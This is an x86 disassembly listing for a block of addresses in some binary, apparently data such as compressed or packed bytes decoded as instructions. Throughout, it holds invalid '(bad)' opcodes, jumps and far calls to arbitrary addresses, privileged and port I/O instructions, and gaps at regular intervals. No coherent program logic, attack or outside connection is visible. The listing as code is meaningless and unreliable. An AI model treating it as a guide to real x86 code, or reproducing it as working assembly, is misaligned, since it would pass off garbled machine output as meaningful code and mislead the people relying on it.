  42a341:	ss xchg si,ax
  42a344:	sti    
  42a345:	jmp    0x42a3ae
  42a347:	xor    al,dh
  42a349:	mov    al,0x2a
  42a34b:	add    dl,BYTE PTR ds:0x2e06a36a
  42a351:	cmp    DWORD PTR [ecx+0x78],0xf657cf69
  42a358:	lods   eax,DWORD PTR ds:[esi]
  42a359:	xor    al,0xdf
  42a35b:	mov    dh,0xba
  42a35d:	rcl    WORD PTR [edx],cl
  42a360:	js     0x42a377
  42a362:	fidiv  DWORD PTR [esi+0x7a]
  42a365:	imul   eax,DWORD PTR [ebp-0x58],0x41
  42a369:	test   edi,ebx
  42a36b:	adc    dh,ah
  42a36d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a36e:	sbb    BYTE PTR [eax+eax*8+0x79],0x3e
  42a373:	jno    0x42a393
  42a375:	shr    DWORD PTR [esi-0x55d84c15],cl
  42a37b:	mov    eax,ds:0xd8330012
  42a380:	cmp    esi,0xfffffff2
  42a383:	mov    esp,0xfff38416
  42a388:	inc    ebp
  42a389:	jno    0x42a3f6
  42a38b:	inc    edx
  42a38c:	test   al,0x29
  42a38e:	(bad)  
  42a390:	popa   
	...
  42a3f1:	add    BYTE PTR [eax],al
  42a3f3:	add    BYTE PTR [edi+0xe],bh
  42a3f6:	jne    0x42a433
  42a3f8:	jne    0x42a475
  42a3fa:	jg     0x42a44a
  42a3fc:	loop   0x42a467
  42a3fe:	mov    ebp,0x566ff53d
  42a403:	push   0x1c482
  42a408:	add    eax,0xaf000001
  42a40d:	xchg   ebx,eax
  42a40e:	fdiv   DWORD PTR [ecx]
  42a410:	pushf  
  42a411:	jg     0x42a3bd
  42a413:	ins    DWORD PTR es:[edi],dx
  42a414:	mov    eax,0xb40313bb
  42a419:	jnp    0x42a48a
  42a41b:	jnp    0x42a3ee
  42a41d:	push   ebp
  42a41e:	sar    DWORD PTR [edi+0x51cbab73],0xd3
  42a425:	out    dx,al
  42a426:	fidiv  WORD PTR ds:0x56262b66
  42a42c:	add    BYTE PTR [eax+ecx*1+0x649b6ff3],al
  42a433:	ror    ah,0xcf
  42a436:	jmp    0xa216:0x234f277e
  42a43d:	mov    BYTE PTR [ecx],0xba
  42a440:	and    al,bl
  42a442:	ins    BYTE PTR es:[edi],dx
  42a443:	ds call 0xb8f7:0xad9911fa
  42a44b:	inc    eax
  42a44c:	sub    eax,0x2ec0da23
  42a451:	inc    ebp
  42a452:	and    BYTE PTR [edi-0x55],dl
  42a455:	xor    al,0x3f
  42a457:	mov    ebx,0xe52d63c
  42a45c:	es pop esi
  42a45e:	lods   eax,DWORD PTR ds:[esi]
  42a45f:	and    ch,BYTE PTR [esi]
  42a461:	jo     0x42a4d3
  42a463:	push   ebp
  42a464:	rol    BYTE PTR [edi-0x74],0x32
  42a468:	ja     0x42a49f
  42a46a:	pop    ss
  42a46b:	dec    edi
  42a46c:	inc    ecx
  42a46d:	or     DWORD PTR [esi+0x43992391],ebp
  42a473:	push   cs
  42a474:	nop
  42a475:	jne    0x42a464
  42a477:	or     BYTE PTR [ebp+eiz*8-0x51],cl
  42a47b:	scas   al,BYTE PTR es:[edi]
  42a47c:	fcmove st,st(1)
  42a47e:	sbb    bh,ch
  42a480:	sti    
  42a481:	cmc    
  42a482:	or     ah,BYTE PTR [edx-0x1364bda4]
  42a488:	sub    eax,0xc66ee473
  42a48d:	or     ebp,DWORD PTR [esi+0x4b]
  42a490:	call   0x8913:0xd460e820
  42a497:	shr    BYTE PTR [edi+0x3dfb227d],cl
  42a49d:	jl     0x42a50f
  42a49f:	pushf  
  42a4a0:	jp     0x42a500
  42a4a2:	std    
  42a4a3:	ja     0x42a462
  42a4a5:	rep ins BYTE PTR es:[edi],dx
  42a4a7:	cmp    DWORD PTR [esi],ecx
  42a4a9:	xchg   edi,eax
  42a4aa:	and    al,0x94
  42a4ac:	popf   
  42a4ad:	jne    0x42a44b
  42a4af:	bound  esp,QWORD PTR [ecx-0x69]
  42a4b2:	aam    0xa4
  42a4b4:	enter  0x1a96,0xe7
  42a4b8:	add    BYTE PTR [edi+edx*1],0x3a
  42a4bc:	mov    eax,0xfa029400
  42a4c2:	xor    DWORD PTR [esp+eax*2-0x3c],edi
  42a4c6:	ror    BYTE PTR ds:0x7d556f9a,1
  42a4cc:	std    
  42a4cd:	xor    al,0xff
  42a4cf:	push   edi
  42a4d0:	inc    ecx
  42a4d1:	cmp    DWORD PTR [eax-0x6],esp
  42a4d4:	dec    edx
  42a4d5:	mov    bl,0x31
  42a4d7:	dec    ebp
  42a4d8:	dec    esi
  42a4d9:	mov    BYTE PTR [esi-0x6],cl
  42a4dc:	xor    bh,BYTE PTR [edi]
  42a4de:	mov    gs,edi
  42a4e0:	jmp    0x5a5f2df7
  42a4e5:	mov    al,0xad
  42a4e7:	push   cs
  42a4e8:	adc    ch,BYTE PTR [ecx]
  42a4ea:	xor    al,0x26
  42a4ec:	pop    ds
  42a4ed:	mov    esi,0xc95009cb
  42a4f2:	leave  
  42a4f3:	call   0x92b1:0xc8aa71bf
  42a4fa:	mov    eax,0xf8e12aa3
  42a4ff:	pop    ds
  42a500:	xor    eax,0x66371110
  42a505:	fs cmp eax,esi
  42a508:	daa    
  42a509:	cmp    bh,BYTE PTR [esi-0x171b1444]
  42a50f:	pop    ebp
  42a510:	xor    al,BYTE PTR [eax]
	...
  42a572:	add    BYTE PTR [eax],al
  42a574:	sbb    BYTE PTR [edi+0x17],cl
  42a577:	mov    ecx,0xefbef957
  42a57c:	(bad)  
  42a57d:	cmc    
  42a57e:	mov    edx,0xefecc99f
  42a583:	je     0x42a50c
  42a585:	lds    eax,FWORD PTR [ecx]
  42a587:	add    BYTE PTR ds:0x4e000001,al
  42a58d:	div    BYTE PTR [ebp+0x36]
  42a590:	push   edi
  42a591:	test   eax,0xbe474e7d
  42a596:	mov    fs,WORD PTR [ebx-0x38]
  42a599:	add    cl,0x67
  42a59c:	pusha  
  42a59d:	ret    
  42a59e:	sbb    esp,DWORD PTR [edi-0x5a]
  42a5a1:	jne    0x42a561
  42a5a3:	js     0x42a5c3
  42a5a5:	mov    eax,DWORD PTR [edx-0x6d9bcba8]
  42a5ab:	mov    bh,0x1c
  42a5ad:	sbb    DWORD PTR [eax+0x2ddf2c09],esi
  42a5b3:	sbb    ebp,DWORD PTR [edi+esi*4]
  42a5b6:	inc    edi
  42a5b7:	inc    eax
  42a5b8:	cmp    BYTE PTR [esi],bh
  42a5ba:	dec    ebp
  42a5bb:	(bad)  
  42a5bc:	mov    ch,0x52
  42a5be:	aam    0xb3
  42a5c0:	jbe    0x42a5ed
  42a5c2:	mov    ebp,DWORD PTR [esi+0x68f91207]
  42a5c8:	test   BYTE PTR [ebx+0x45c62111],dh
  42a5ce:	lea    esi,[eax+0x2a]
  42a5d1:	add    al,0xf4
  42a5d3:	lea    edi,[ebx-0x450c7124]
  42a5d9:	and    esi,edi
  42a5db:	out    0x20,al
  42a5dd:	out    dx,eax
  42a5de:	mov    ecx,0xb65aa44d
  42a5e3:	pop    ebx
  42a5e4:	jle    0x42a567
  42a5e6:	pop    ds
  42a5e7:	push   0xf5088289
  42a5ec:	adc    al,0x72
  42a5ee:	loopne 0x42a5f0
  42a5f0:	jmp    0xc5b4835a
  42a5f5:	js     0x42a63b
  42a5f7:	inc    esp
  42a5f8:	cli    
  42a5f9:	repz cmc 
  42a5fb:	js     0x42a588
  42a5fd:	sbb    esp,DWORD PTR [ecx+0x57]
  42a600:	(bad)  
  42a601:	push   esi
  42a602:	jne    0x42a5e5
  42a604:	jecxz  0x42a62f
  42a606:	dec    edx
  42a607:	jo     0x42a5e5
  42a609:	lods   eax,DWORD PTR ds:[esi]
  42a60a:	mov    ebp,0x3373f6b0
  42a60f:	outs   dx,DWORD PTR ds:[esi]
  42a610:	(bad)  
  42a611:	pop    ss
  42a612:	(bad)  
  42a613:	xchg   ecx,eax
  42a614:	jmp    0x22ce6705
  42a619:	adc    DWORD PTR [esi+eax*4],ecx
  42a61c:	stc    
  42a61d:	stc    
  42a61e:	push   0xde33bc6
  42a623:	inc    edi
  42a624:	jmp    0xbec5:0xb2afda89
  42a62b:	leave  
  42a62c:	pop    ebp
  42a62d:	push   0xbb230e63
  42a632:	dec    ebx
  42a633:	outs   dx,BYTE PTR ds:[esi]
  42a634:	dec    ecx
  42a635:	pop    edx
  42a636:	push   esi
  42a637:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a638:	mov    bh,0xdf
  42a63a:	cmp    DWORD PTR [ecx],ebp
  42a63c:	push   esp
  42a63d:	call   0xe7bcf455
  42a642:	push   es
  42a643:	lock mov ecx,0xe6c23779
  42a649:	in     al,dx
  42a64a:	hlt    
  42a64b:	lea    edx,[ebx+ecx*4+0x4bd154ea]
  42a652:	push   cs
  42a653:	(bad)  
  42a654:	fist   DWORD PTR [eax]
  42a656:	je     0x42a66d
  42a658:	cmp    ch,0xf0
  42a65b:	(bad)  
  42a65d:	push   ds
  42a65e:	mov    ds:0x77e2a155,eax
  42a663:	push   0xffffffa3
  42a665:	dec    ebx
  42a666:	add    al,0x9d
  42a668:	sbb    eax,0x1c5a488
  42a66d:	shr    BYTE PTR [edi],0x71
  42a670:	pop    edi
  42a671:	push   edx
  42a672:	retf   0x640c
  42a675:	xlat   BYTE PTR ds:[ebx]
  42a676:	add    BYTE PTR [esi+0x381ebb7e],ch
  42a67c:	dec    ebx
  42a67d:	mov    eax,ds:0xb3e07526
  42a682:	(bad)  
  42a683:	cmp    BYTE PTR [ecx+0x5],cl
  42a686:	int    0x11
  42a688:	mov    ch,0x4
  42a68a:	and    ah,0x44
  42a68d:	fcomp  DWORD PTR [edi-0x7b]
  42a690:	fiadd  DWORD PTR [eax]
	...
  42a6f2:	add    BYTE PTR [eax],al
  42a6f4:	and    al,0x16
  42a6f6:	outs   dx,BYTE PTR ds:[esi]
  42a6f7:	(bad)  
  42a6f8:	jle    0x42a6f9
  42a6fa:	lods   eax,DWORD PTR ds:[esi]
  42a6fb:	test   DWORD PTR [edi-0x6247ece4],0x8c1b16b0
  42a705:	mov    BYTE PTR [ecx],0x0
  42a708:	add    eax,0x7b000001
  42a70d:	dec    ecx
  42a70e:	aaa    
  42a70f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a710:	push   ecx
  42a711:	inc    ecx
  42a712:	adc    esp,DWORD PTR [ebx+0x17]
  42a715:	out    0x38,eax
  42a717:	xchg   ebx,eax
  42a718:	sub    DWORD PTR [ecx-0x66],eax
  42a71b:	bswap  esi
  42a71d:	shl    BYTE PTR [edi+0x43],1
  42a720:	loopne 0x42a768
  42a722:	repnz fnstcw WORD PTR [edx+eiz*8+0x6d324b90]
  42a72a:	xchg   edi,eax
  42a72b:	xor    DWORD PTR [ebp+0x24006c0d],ebx
  42a731:	shr    DWORD PTR [edi],cl
  42a733:	pop    eax
  42a734:	sbb    DWORD PTR [edx+0x46],0x45
  42a738:	mov    eax,0x9521af10
  42a73d:	dec    edi
  42a73e:	jge    0x42a74c
  42a740:	add    eax,DWORD PTR [edi-0x6d784224]
  42a746:	xchg   ebp,eax
  42a747:	jnp    0x42a753
  42a749:	push   es
  42a74a:	jge    0x42a7ba
  42a74c:	adc    ebp,DWORD PTR [esi+esi*8]
  42a74f:	fsubr  st(2),st
  42a751:	frstor [eax+esi*4-0x455f57d0]
  42a758:	add    BYTE PTR [esi+0x3fb4d4be],bl
  42a75e:	pop    es
  42a75f:	retf   
  42a760:	cmp    al,0x3
  42a762:	loop   0x42a7ad
  42a764:	scas   al,BYTE PTR es:[edi]
  42a765:	cdq    
  42a766:	pop    ebx
  42a767:	leave  
  42a768:	mov    WORD PTR [edx+ecx*8-0x70],ds
  42a76c:	cmc    
  42a76d:	mov    al,0xd
  42a76f:	leave  
  42a770:	cmp    al,BYTE PTR [eax+0x1ba17bf9]
  42a776:	mov    ds:0xac54f0c0,al
  42a77b:	push   ds
  42a77c:	retf   0x314f
  42a77f:	sub    eax,0x8648707a
  42a784:	ins    DWORD PTR es:[edi],dx
  42a785:	std    
  42a786:	outs   dx,BYTE PTR ds:[esi]
  42a787:	loope  0x42a7c3
  42a789:	dec    ebp
  42a78a:	lock pop esi
  42a78c:	nop
  42a78d:	hlt    
  42a78e:	repz add DWORD PTR [esi],esp
  42a791:	enter  0xaaec,0x5a
  42a795:	and    BYTE PTR [eax+eax*8-0x37b7be06],al
  42a79c:	push   esi
  42a79d:	mov    ds:0x559cc7e4,eax
  42a7a2:	int    0xc2
  42a7a4:	xchg   BYTE PTR [eax+0x7afb7280],cl
  42a7aa:	cmp    DWORD PTR [ebx],0xec1dc70c
  42a7b0:	lds    edx,FWORD PTR [ecx-0x122d1954]
  42a7b6:	(bad)  
  42a7b7:	fsubr  QWORD PTR [edi]
  42a7b9:	dec    ecx
  42a7ba:	adc    DWORD PTR [edx+0x45],esi
  42a7bd:	daa    
  42a7be:	jnp    0x42a7ed
  42a7c0:	(bad)  
  42a7c1:	sbb    cl,BYTE PTR [ebx]
  42a7c3:	gs add eax,0xe1a34000
  42a7c9:	xchg   esp,eax
  42a7ca:	test   al,0x92
  42a7cc:	sbb    bl,BYTE PTR [edi]
  42a7ce:	fisttp DWORD PTR [ebp+0x68]
  42a7d1:	test   BYTE PTR ds:0x92291063,0x91
  42a7d8:	into   
  42a7d9:	dec    edx
  42a7da:	xchg   ebx,eax
  42a7db:	in     al,dx
  42a7dc:	mov    esi,0xe703ca31
  42a7e1:	cmp    al,0xb6
  42a7e3:	nop
  42a7e4:	adc    al,0xcb
  42a7e6:	push   es
  42a7e7:	sub    BYTE PTR [edx-0x72978f83],dh
  42a7ed:	push   ss
  42a7ee:	(bad)  
  42a7ef:	jb     0x42a79a
  42a7f1:	push   esp
  42a7f2:	(bad)  
  42a7f3:	call   0xa36c11c4
  42a7f8:	sub    dh,bl
  42a7fa:	pop    esp
  42a7fb:	sub    al,0xb7
  42a7fd:	inc    edx
  42a7fe:	fwait
  42a7ff:	xchg   dl,dl
  42a801:	iret   
  42a802:	inc    eax
  42a803:	lods   al,BYTE PTR ds:[esi]
  42a804:	data16 aad 0x36
  42a807:	fist   WORD PTR [eax]
  42a809:	add    DWORD PTR [esi+0x560f921f],ebx
  42a80f:	loop   0x42a7b4
	...
  42a871:	add    BYTE PTR [eax],al
  42a873:	add    BYTE PTR [edx-0x10409c9b],cl
  42a879:	mov    edi,0xc58175de
  42a87e:	xchg   edi,eax
  42a87f:	ins    BYTE PTR es:[edi],dx
  42a880:	mov    dh,0x75
  42a882:	push   cs
  42a883:	mov    BYTE PTR [ecx+0x50001c7],dl
  42a889:	add    DWORD PTR [eax],eax
  42a88b:	add    BYTE PTR [edi+0x32041714],ah
  42a891:	xchg   ebp,eax
  42a892:	xchg   BYTE PTR [ebx+0x12],al
  42a895:	jb     0x42a8bd
  42a897:	popa   
  42a898:	bound  esi,QWORD PTR [eax]
  42a89a:	das    
  42a89b:	mov    dh,0x19
  42a89d:	push   ebx
  42a89e:	loope  0x42a905
  42a8a0:	and    eax,0x9d91566a
  42a8a5:	jnp    0x42a8bc
  42a8a7:	xor    al,0x67
  42a8a9:	add    BYTE PTR [ebx],al
  42a8ab:	ror    ch,1
  42a8ad:	fisub  WORD PTR [ebx-0x7f2e8d7b]
  42a8b3:	pop    ebp
  42a8b4:	outs   dx,DWORD PTR ds:[esi]
  42a8b5:	stos   DWORD PTR es:[edi],eax
  42a8b6:	call   0x60a8:0xfa551062
  42a8bd:	push   esi
  42a8be:	and    DWORD PTR [esi-0x3f],edi
  42a8c1:	add    BYTE PTR [ebp+0x1287c05f],cl
  42a8c7:	xchg   esp,eax
  42a8c8:	push   es
  42a8c9:	mov    ah,0xe4
  42a8cb:	imul   edx,DWORD PTR [edi],0xb8d43e70
  42a8d1:	add    cl,BYTE PTR [ecx-0x59ad96ab]
  42a8d7:	xor    DWORD PTR [edx],esi
  42a8d9:	sbb    esi,DWORD PTR [eax+0x4799481]
  42a8df:	aad    0xd1
  42a8e1:	loop   0x42a8a6
  42a8e3:	popf   
  42a8e4:	or     DWORD PTR [edi],ecx
  42a8e6:	push   0xefe7c276
  42a8eb:	push   cs
  42a8ec:	xchg   edi,eax
  42a8ed:	popf   
  42a8ee:	xor    al,BYTE PTR [ebx+0x67efa49f]
  42a8f4:	test   DWORD PTR [edi+0xf],0xa0ae0b89
  42a8fb:	mov    ecx,0xaa95ec1b
  42a900:	mov    edx,0xcb6bebe9
  42a905:	lea    ecx,[ebx+0x51e08f21]
  42a90b:	mov    esp,ebp
  42a90d:	std    
  42a90e:	jae    0x42a917
  42a910:	jne    0x42a98a
  42a912:	out    dx,al
  42a913:	gs jae 0x42a8f7
  42a916:	push   edi
  42a917:	and    ecx,DWORD PTR [ecx-0x690f0d69]
  42a91d:	test   BYTE PTR [eax],0xbf
  42a920:	ins    DWORD PTR es:[edi],dx
  42a921:	fdiv   DWORD PTR ds:0x93962030
  42a927:	or     esi,DWORD PTR [edi+0x20]
  42a92a:	lods   al,BYTE PTR ds:[esi]
  42a92b:	adc    DWORD PTR [eax+0x163930d2],ebx
  42a931:	(bad)  
  42a932:	and    eax,0xb95c62b0
  42a937:	scas   al,BYTE PTR es:[edi]
  42a938:	mov    edx,0x633d9f63
  42a93d:	push   cs
  42a93e:	adc    BYTE PTR [edx+edx*1-0x2c44cfd9],bl
  42a945:	lods   al,BYTE PTR ds:[esi]
  42a946:	cmp    DWORD PTR [ebx],esp
  42a948:	pusha  
  42a949:	jnp    0x42a978
  42a94b:	push   cs
  42a94c:	mov    al,0x44
  42a94e:	js     0x42a963
  42a950:	fsubr  DWORD PTR [edi-0x29cae034]
  42a956:	jns    0x42a9ad
  42a958:	ss dec esi
  42a95a:	test   eax,0x6705d0eb
  42a95f:	mov    cl,0x1a
  42a961:	in     eax,0x15
  42a963:	mov    ch,0x2
  42a965:	sub    DWORD PTR [edx-0x6f],esp
  42a968:	repz aad 0x33
  42a96b:	xchg   ecx,eax
  42a96c:	adc    ch,al
  42a96e:	add    BYTE PTR [edi-0x3b],cl
  42a971:	sub    BYTE PTR [ecx+0x77ac9045],bl
  42a977:	push   ebx
  42a978:	jbe    0x42a922
  42a97a:	ds dec eax
  42a97c:	fcom   QWORD PTR [ecx+ecx*8]
  42a97f:	popf   
  42a980:	inc    ecx
  42a981:	lods   al,BYTE PTR ds:[esi]
  42a982:	(bad)  
  42a983:	fist   WORD PTR [ebp-0x2ed20df5]
  42a989:	adc    eax,DWORD PTR [ebx-0x2718277b]
  42a98f:	xchg   ebp,eax
  42a990:	int    0x0
	...
  42a9f2:	add    BYTE PTR [eax],al
  42a9f4:	test   al,0x93
  42a9f6:	sbb    eax,0xfbee3fee
  42a9fb:	xlat   BYTE PTR ds:[ebx]
  42a9fc:	in     eax,0xd3
  42a9fe:	aad    0x7
  42aa00:	aam    0x79
  42aa02:	test   BYTE PTR [ebx+0x1c896],0x5
  42aa09:	add    DWORD PTR [eax],eax
  42aa0b:	add    BYTE PTR [ebx+0x575346f8],al
  42aa11:	out    dx,eax
  42aa12:	shr    DWORD PTR [edx-0xb],0xb8
  42aa16:	mov    edi,0xf1238d71
  42aa1b:	mov    DWORD PTR [ecx],edx
  42aa1d:	stc    
  42aa1e:	mov    ds:0x3733527a,eax
  42aa23:	fcomp  QWORD PTR [ecx+0x48]
  42aa26:	cmc    
  42aa27:	shr    DWORD PTR [eax],cl
  42aa29:	jb     0x42aa38
  42aa2b:	retf   
  42aa2c:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  42aa2e:	call   0x13b3:0xc674c202
  42aa35:	retw   
  42aa37:	sub    ch,BYTE PTR [edi-0x77405dbb]
  42aa3d:	jle    0x42aabc
  42aa3f:	push   ebp
  42aa40:	adc    dl,BYTE PTR cs:[edx]
  42aa43:	xor    eax,0x510edc0a
  42aa48:	test   DWORD PTR [edi+0x6c],ecx
  42aa4b:	jle    0x42aa5f
  42aa4d:	enter  0x5923,0xf2
  42aa51:	nop
  42aa52:	xor    ecx,0x2c
  42aa55:	inc    esp
  42aa56:	in     eax,dx
  42aa57:	add    DWORD PTR [ebx+0x5149ceb8],ecx
  42aa5d:	sub    ecx,DWORD PTR [ebx+0x6fb6bf9e]
  42aa63:	sbb    eax,0xf06cf721
  42aa68:	fldenv [ebx-0x33]
  42aa6b:	popf   
  42aa6c:	aad    0x21
  42aa6e:	or     cl,ch
  42aa70:	rcl    BYTE PTR [edi+0x29],cl
  42aa73:	add    al,0x58
  42aa75:	sbb    eax,0x946fdf11
  42aa7a:	xor    al,0xd1
  42aa7c:	mov    ah,0x7b
  42aa7e:	(bad)  
  42aa81:	jae    0x42aa7d
  42aa83:	xor    ch,dl
  42aa85:	mov    eax,ds:0x9528916
  42aa8a:	push   ss
  42aa8b:	shr    DWORD PTR [ebx+0x59],cl
  42aa8e:	mov    ds:0x36eb0196,eax
  42aa93:	jg     0x42aae1
  42aa95:	add    eax,0xc9896550
  42aa9a:	repz ss sub eax,0xb92b0fae
  42aaa1:	xchg   BYTE PTR [ecx],al
  42aaa3:	adc    eax,0x1d4ef9f2
  42aaa8:	xchg   ecx,eax
  42aaa9:	dec    esp
  42aaaa:	ja     0x42ab22
  42aaac:	mov    DWORD PTR [ebp-0x76],ebx
  42aaaf:	sbb    DWORD PTR [eax-0x1d],edi
  42aab2:	int    0xae
  42aab4:	ret    
  42aab5:	xor    al,0x46
  42aab8:	and    BYTE PTR [ebx],cl
  42aaba:	jl     0x42aaf8
  42aabc:	test   al,0x5c
  42aabe:	xor    BYTE PTR ds:0xe559606e,dh
  42aac4:	push   ebx
  42aac5:	in     al,dx
  42aac6:	jmp    0x42aa8f
  42aac8:	adc    BYTE PTR [ecx+0x1ba82dcb],ah
  42aace:	push   eax
  42aacf:	daa    
  42aad0:	push   esi
  42aad1:	int3   
  42aad2:	jae    0x42aafb
  42aad4:	pop    eax
  42aad5:	xlat   BYTE PTR ds:[ebx]
  42aad6:	sub    eax,DWORD PTR [esi+0x4bacd7fd]
  42aadc:	(bad)  
  42aadd:	fisttp WORD PTR [edx+0x64]
  42aae0:	mov    ecx,0xd6f99142
  42aae5:	pop    ebx
  42aae6:	loope  0x42ab01
  42aae8:	bound  ecx,QWORD PTR [esp+ebp*4]
  42aaeb:	fs (bad) 
  42aaed:	cmp    eax,0xb827ad0
  42aaf2:	mov    dh,0x15
  42aaf4:	or     bh,al
  42aaf6:	jae    0x42aab2
  42aaf8:	push   es
  42aaf9:	jns    0x42ab14
  42aafb:	test   DWORD PTR [ecx],ebp
  42aafd:	stc    
  42aafe:	enter  0xa4a8,0x33
  42ab02:	cmc    
  42ab03:	push   edi
  42ab04:	popf   
  42ab05:	cdq    
  42ab06:	jae    0x42aad8
  42ab08:	test   al,0xce
  42ab0a:	hlt    
  42ab0b:	pop    ss
  42ab0c:	adc    al,0x28
  42ab0e:	and    dl,BYTE PTR [ecx+0x78]
	...
  42ab74:	ds push cs
  42ab76:	sub    al,0x5d
  42ab78:	cmp    al,0x7f
  42ab7a:	jg     0x42abeb
  42ab7c:	and    BYTE PTR [eax],cl
  42ab7e:	mov    dl,0x43
  42ab80:	pushf  
  42ab81:	push   cs
  42ab82:	fild   DWORD PTR [ecx+0x1c99b]
  42ab88:	add    eax,0xce000001
  42ab8d:	les    ecx,FWORD PTR [edx-0x69]
  42ab90:	or     cl,BYTE PTR [edx-0x5995413]
  42ab96:	repz dec eax
  42ab98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ab99:	xor    ch,bl
  42ab9b:	scas   eax,DWORD PTR es:[edi]
  42ab9c:	jp     0x42ab79
  42ab9e:	loop   0x42ab64
  42aba0:	jl     0x42ac1d
  42aba2:	dec    ecx
  42aba3:	test   eax,0x37f9a794
  42aba8:	icebp  
  42aba9:	data16 jae 0x42abf1
  42abac:	idiv   BYTE PTR [ecx+0x775a9986]
  42abb2:	jne    0x42ac0a
  42abb4:	xchg   edi,eax
  42abb5:	pop    ds
  42abb6:	dec    esi
  42abb7:	xlat   BYTE PTR ds:[ebx]
  42abb8:	mov    edx,0xcea50ef7
  42abbd:	dec    ecx
  42abbe:	nop
  42abbf:	rsm    
  42abc1:	pop    ds
  42abc2:	imul   edi,ecx,0x0
  42abc5:	pop    esi
  42abc6:	add    BYTE PTR [ebx],0xe6
  42abc9:	arpl   WORD PTR ds:[esi+0x2bdb8f63],si
  42abd0:	bound  eax,QWORD PTR [ecx-0x5f]
  42abd3:	sbb    cl,BYTE PTR ds:0xbd0d81cb
  42abd9:	or     al,BYTE PTR [edi+0x3b146d5b]
  42abdf:	outs   dx,DWORD PTR ds:[esi]
  42abe0:	aas    
  42abe1:	int3   
  42abe2:	sar    ebx,cl
  42abe4:	jl     0x42abb0
  42abe6:	push   0x57
  42abe8:	imul   ebp,DWORD PTR [esi],0xe1f7c595
  42abee:	jae    0x42ab78
  42abf0:	jmp    0x42ab87
  42abf2:	or     ebp,DWORD PTR [esi-0x3767456f]
  42abf8:	push   ss
  42abf9:	ror    BYTE PTR [ecx],cl
  42abfb:	dec    ebx
  42abfc:	mov    cl,0xb6
  42abfe:	mov    edx,0x131a66c
  42ac03:	jne    0x42abe7
  42ac05:	jecxz  0x42abd2
  42ac07:	or     BYTE PTR [eax],cl
  42ac09:	sbb    al,0x5a
  42ac0b:	fwait
  42ac0c:	sub    BYTE PTR [eax+eiz*1-0x56d223a7],ah
  42ac13:	ficom  DWORD PTR [edx]
  42ac15:	fldz   
  42ac17:	mov    DWORD PTR [esp+ebx*8],ebx
  42ac1a:	stos   BYTE PTR es:[edi],al
  42ac1b:	out    0x42,al
  42ac1d:	into   
  42ac1e:	das    
  42ac1f:	xlat   BYTE PTR ds:[ebx]
  42ac20:	mov    dh,0x78
  42ac22:	jmp    0x13a436ad
  42ac27:	fild   WORD PTR [eax-0x741c5be2]
  42ac2d:	imul   edx,DWORD PTR [eax-0x72],0xffffffa9
  42ac31:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ac33:	sar    ecx,cl
  42ac35:	out    dx,eax
  42ac36:	or     cl,BYTE PTR [esi-0x39e6b5e4]
  42ac3c:	push   ebx
  42ac3d:	ror    esp,0xf5
  42ac40:	xor    BYTE PTR [edx+0x1d5b51c6],dl
  42ac46:	add    BYTE PTR [ebx],ah
  42ac48:	shr    DWORD PTR [ecx-0x4207d4b3],0x6c
  42ac4f:	ror    edx,0x62
  42ac52:	cmp    DWORD PTR [ecx+ebx*8-0x381f95dc],esp
  42ac59:	dec    ebp
  42ac5a:	xor    BYTE PTR [esi-0x44131e6c],ah
  42ac60:	ret    0x1692
  42ac63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ac64:	ror    DWORD PTR [ebp-0x3a3c0190],1
  42ac6a:	mov    ch,0x7b
  42ac6c:	mov    ebx,0x72990157
  42ac71:	int3   
  42ac72:	dec    ecx
  42ac73:	or     eax,ecx
  42ac75:	cs rol dh,1
  42ac78:	lea    ebx,[edx+0x48]
  42ac7b:	and    ah,BYTE PTR [edx-0x23bc81fd]
  42ac81:	xlat   BYTE PTR ds:[ebx]
  42ac82:	cmp    eax,0xac8ce24b
  42ac87:	daa    
  42ac88:	pop    ebp
  42ac89:	rol    esp,1
  42ac8b:	sub    eax,0xfe6a60b0
  42ac90:	xchg   DWORD PTR [eax],eax
	...
  42acf2:	add    BYTE PTR [eax],al
  42acf4:	jmp    0xdf7cc92b
  42acf9:	ds out dx,eax
  42acfb:	repz ret 
  42acfd:	fcom   DWORD PTR [edx+0x72]
  42ad00:	xor    BYTE PTR [esi-0x355fd227],bl
  42ad06:	add    DWORD PTR [eax],eax
  42ad08:	add    eax,0x9b000001
  42ad0d:	std    
  42ad0e:	xchg   DWORD PTR [eax-0x7c],edi
  42ad11:	jge    0x42acdf
  42ad13:	mov    WORD PTR [ecx],fs
  42ad15:	mov    al,0x55
  42ad17:	jne    0x42ad04
  42ad19:	lds    ebp,FWORD PTR [ecx-0x70696038]
  42ad1f:	mov    es,WORD PTR [edx]
  42ad21:	jbe    0x42ad3e
  42ad23:	mov    WORD PTR [edx],ss
  42ad25:	psrlw  mm2,QWORD PTR [edx-0x4f]
  42ad29:	dec    ebp
  42ad2a:	pushf  
  42ad2b:	mov    al,0x84
  42ad2d:	and    ebp,DWORD PTR [ebx+0x34]
  42ad30:	in     eax,dx
  42ad31:	fnsave [esi+eiz*2]
  42ad34:	sub    DWORD PTR [esi-0x187b67cf],0xffffffd8
  42ad3b:	jp     0x42ad2c
  42ad3d:	inc    esi
  42ad3e:	pop    ebx
  42ad3f:	jns    0x42ad08
  42ad41:	xchg   ebp,eax
  42ad42:	shl    BYTE PTR [ecx-0x6ce22272],cl
  42ad48:	pop    ds
  42ad49:	(bad)  
  42ad4b:	enter  0x6aa9,0x4a
  42ad4f:	push   ds
  42ad50:	inc    eax
  42ad51:	mov    esp,0x96794b90
  42ad56:	aam    0x8e
  42ad58:	sbb    ecx,DWORD PTR [edx+edi*1]
  42ad5b:	xchg   BYTE PTR [esi+0x30],dl
  42ad5e:	sahf   
  42ad5f:	mov    ah,0x3a
  42ad61:	fdivr  QWORD PTR [esi+0x6ad887e5]
  42ad67:	sub    dh,0x45
  42ad6a:	sti    
  42ad6b:	and    edi,DWORD PTR [eax-0x1c]
  42ad6e:	nop
  42ad6f:	or     edx,DWORD PTR [ebp-0x15544d92]
  42ad75:	jp     0x42ade0
  42ad77:	scas   al,BYTE PTR es:[edi]
  42ad78:	dec    DWORD PTR [eax]
  42ad7a:	push   ds
  42ad7b:	pusha  
  42ad7c:	adc    DWORD PTR [edx+edi*1+0x37],edx
  42ad80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ad81:	xchg   ecx,eax
  42ad82:	iret   
